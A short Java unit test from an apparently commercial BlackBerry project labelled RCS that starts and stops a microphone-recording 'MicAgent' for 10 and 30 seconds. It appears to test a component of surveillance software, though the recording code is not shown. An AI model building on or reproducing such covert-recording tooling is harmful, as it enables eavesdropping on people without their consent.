//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_IMAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;

import blackberry.AgentManager;
import blackberry.Status;
import blackberry.agent.Agent;
import blackberry.agent.MessageAgent;
import blackberry.agent.MicAgent;
import blackberry.fs.Path;
import blackberry.utils.Utils;
import tests.AssertException;
import tests.TestUnit;
import tests.Tests;

// TODO: Auto-generated Javadoc
/**
 * The Class UT_IMAgent.
 */
public final class UT_MicAgent extends TestUnit {

    /**
     * Instantiates a new u t_ im agent.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_MicAgent(final String name, final Tests tests) {
        super(name, tests);
    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {
        Path.makeDirs(Path.SD);
        
        record(10000);
        Utils.sleep(1000);
        record(30000);
        
        return true;
    }

    private void record(int timeout) throws AssertException {
        final Status status = Status.getInstance();
        status.clear();
        final AgentManager agentManager = AgentManager.getInstance();
        
        final MicAgent agent = (MicAgent) Agent.factory(
                Agent.AGENT_MIC, true, new byte[0]);
        
        AssertNotNull(agent, "null agent");
        
        status.addAgent(agent);        
        agentManager.start(agent.agentId);
        //#ifdef DEBUG_INFO
        debug.info("Agents started");
        //#endif
        
        Utils.sleep(timeout);
        
        agentManager.stop(agent.agentId);
      //#ifdef DEBUG_INFO
        debug.info("Agents stopped");
        //#endif
    }

}
